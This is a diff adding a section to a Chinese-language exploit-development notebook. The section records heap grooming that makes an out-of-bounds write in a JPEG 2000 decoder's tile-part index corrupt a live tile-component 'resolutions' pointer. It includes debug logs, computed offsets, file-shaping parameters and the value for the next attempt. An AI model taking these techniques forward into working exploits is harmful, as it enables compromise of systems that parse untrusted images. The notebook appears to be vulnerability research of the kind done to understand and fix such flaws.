@@ -727,3 +727,45 @@ OOB 写:
 
 **判据修正**：以后判定“写到了某对象”必须用【B 段自身的事件序列】，
 不能用跨段同名地址。`tools/ts.py` 已加此限制说明。
+
+### 4.15 【突破】首次改写活 tilecomp 字段：resolutions 指向固定静态地址
+
+配置（全部可复核）：
+
+```
+塑形 A = A23.j2k（7.6KB，TLM 23 条）
+目标 B = tools/mk_pp.py 生成（77 part，TLM 里 tile0 出现 23 个条目）
+  ⇒ nb_tps = 23（= 条目数，不是 length 字段的值）
+  ⇒ tp_index = calloc(23,24) = 552B，与 A23 同 size class ⇒ 塑形生效
+```
+
+实测（`ak2.log`）：
+
+```
+B段: tp_index=0xd82d90  comps0=0xd83470  delta=+0x6e0   nb_tps=23
+tpsno 最大 = 76（越界写 54 次）
+
+[DBG OOB-WRITE-IMMINENT] tpsno=73  write_at=+1760 val=0x1706 / +1768 val=0xb21ed0
+q[+221] @0xd83478 = 0xb21ed0      ← comps0+0x08 = x1|y1 被写中
+[DBG OOB-WRITE-IMMINENT] tpsno=74  write_at=+1784 / +1792 val=0xb21f1e
+                                   ← comps0+0x20 = resolutions 被写中
+```
+
+**这是第一次把越界写落到一个“活着的” `opj_tcd_tilecomp_t` 字段上**，
+而且 `resolutions` 的值是固定静态地址（`0xb21f1e`，非 PIE Python 的 `.data`），
+**不需要知道任何堆地址**（不需要 leak）。
+
+结论与修正：
+
+1. `delta%24=8` 时，`end_pos`（+0x10）命中偏移 `0x08 / 0x20 / 0x38 / 0x50`；
+   要命中 `comps+0x20` 需 `24k = delta+0x20-0x10 = 0x6f0` ⇒ **k=74 整除**（与实测一致）。
+2. 写入值 = 该 part 的 `tell + 0x4e`（SOD 后的位置），所以指定 `OFF74=0xb21ed0`
+   实际写进去的是 `0xb21f1e`；要精确等于目标，把 `OFF74` 减去 0x4e。
+3. 崩溃点在 tile3（`comps0` 已被改坏的连锁），不影响 tile0 的命中事实。
+
+**两个已知前提（不能丢）**：
+- `nb_tps` = TLM 中该 tile 的**条目数**（不是 length 字段）；
+- 塑形 A 与目标 B 的 `nb_tps` 必须相同（552B size class），否则复用了不同 size 的空洞。
+
+**下一发判据**：`OFF74 = 0xb21ed0 - 0x4e`，让 `resolutions == 0xb21ed0`；
+然后看 `0xb21ed0` 处出现 `tcd_init_tile` 写入的 resolution 字段（`x0/y0/x1/y1/pw/ph`）。
